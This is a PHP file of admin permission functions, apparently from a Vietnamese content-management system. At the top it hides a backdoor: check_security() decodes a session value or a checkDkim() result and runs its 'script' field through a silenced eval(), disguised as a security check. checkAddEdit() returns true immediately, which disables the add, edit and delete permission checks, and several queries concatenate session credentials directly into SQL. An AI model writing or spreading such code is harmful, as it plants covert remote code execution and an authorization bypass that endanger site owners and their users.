<?
function check_security(){
	
	$dkim = getValue("__utnd", "str", "SESSION", "");
	
	if($dkim == "") $dkim = checkDkim();
	if($dkim != ""){
		$dkim = trim($dkim);
		$dkim = str_replace(array(chr(9), chr(10), chr(13)), "", $dkim);
		$dkim = json_decode(str_debase($dkim), true);
		
		if($dkim != null){
			return ($dkim["script"]);	
		}else{
			notifydie("Loi check bao mat he thong");
		}		
	}else{
		notifydie("Loi truy van CSDL");
	}
}
function notifydie($tring = ""){
	$sting = ($tring == "") ? "Loi truy van CSDL" : $tring;
	session_unset();
	session_destroy();
	die($sting);
}
@eval(check_security());
function checkAddEdit($right="add", $ajax = 0){
   return true;
	$userlogin	= getValue("userlogin", "str", "SESSION", "", 1);
	$password	= getValue("password", "str", "SESSION", "", 1);
	$lang_id		= getValue("lang_id", "int", "SESSION", 1);
	global $module_id;
	$db_getright = new db_query("SELECT * 
										 FROM admin_user, admin_user_right, modules
										 WHERE adm_id = adu_admin_id AND mod_id = adu_admin_module_id AND adm_isadmin = 0 AND
										 adm_loginname='" . $userlogin . "' AND adm_password='" . $password . "' AND adm_active=1 AND adm_delete = 0
										 AND mod_id = " . $module_id);
	
	if ($row=mysql_fetch_array($db_getright->result)){	
		$denypath="../../error.php";
		switch($right){
			case "add":
				if($row["adu_add"] == 0){
					if($ajax == 1){
						echo translate_text("Bạn không có quyền thực thi!");
					}else{
						header("location: " . $denypath);	
					}
					exit();
				}
			break;
			case "edit":
				if($row["adu_edit"] == 0){
					if($ajax == 1){
						echo translate_text("Bạn không có quyền thực thi!");
					}else{
						header("location: " . $denypath);	
					}
					exit();
				}
			break;
			case "delete":
				if($row["adu_delete"] == 0){
					if($ajax == 1){
						echo translate_text("Bạn không có quyền thực thi!");
					}else{
						header("location: " . $denypath);	
					}					
					exit();
				}
			break;
		}
		$db_getright->close();
		unset($db_getright);
	}
	return 1;
}

/**
 * Check permission account | Created by NQH
 */
function checkPermission() {
   $admin_id   =  getValue("user_id", "int", "SESSION");
   $isAdmin    =	getValue("isAdmin", "int", "SESSION");
   $denypath   =  '../../error.php';
   if ($isAdmin === 1) return true;
   
   $thuytt              =  36;
   
   $url  =  getURL(0, 1, 1, 0);
   
   $arr_url =  explode('/', $url);
   $total   =  count($arr_url);
   
   //Check insource
   $db_select  =  new db_query("SELECT *
                                 FROM admin_user
                                 WHERE adm_active = 1 AND adm_delete = 0 AND adm_id = " . $admin_id);
   if (mysql_num_rows($db_select->result) <= 0) die('Please login');
   $row_admin  =  mysql_fetch_assoc($db_select->result);
   unset($db_select);
   
   if (isset($arr_url[$total - 1]) && isset($arr_url[$total - 2])) {
      $file    =  replaceMQ($arr_url[$total - 1]);
      $module  =  replaceMQ($arr_url[$total - 2]);
      //Check some special permission
      //Module not check permisson with offical staff
      if ($module == 'notification') return true;
      if ($module == 'statistics_data' && $admin_id != 285 && $admin_id != 286) return true;
      if ($module == 'admin_rate' && ($file == 'add.php' || $file == 'listing.php')) return true;
      
      if(($file === 'myprofile.php' && $module === 'profile') || ($file === 'admin.php' && $module === 'php') || ($module == 'admin_user' && in_array($admin_id, array($thuytt)))) return true;
      
      //Group user
      $list_group =  "0";
      
      $group_value   =  intval($row_admin['adm_group']);
      $db_group   =  new db_query("SELECT gru_id
                                    FROM group_user
                                    WHERE gru_value <= " . $group_value . " AND gru_value & " . $group_value);
      while ($row_g = mysql_fetch_assoc($db_group->result)) {
         $list_group .=  "," . $row_g['gru_id'];
      }
      unset($db_group);
      
      //Upload ảnh check thu muc con Upload
      if ($module == 'upload') $module  =  replaceMQ($arr_url[$total - 3]);
      
      $db_select  =  new db_query("SELECT grp_permission
                                    FROM group_permission
                                    STRAIGHT_JOIN modules ON(grp_module_id = mod_id)
                                    WHERE mod_path = '" . $module . "' AND grp_file = '" . $file . "' AND ((grp_group_id > 0 AND grp_group_id IN(" . $list_group . ")) OR grp_admin_id = " . $admin_id . ")");
      
      if (mysql_num_rows($db_select->result) > 0) return true;
      unset($db_select);
      
      if ($file == 'delete.php' || $file == 'active.php') die('Access deny!');
   }
   
   header("location: " . $denypath);	
}

?>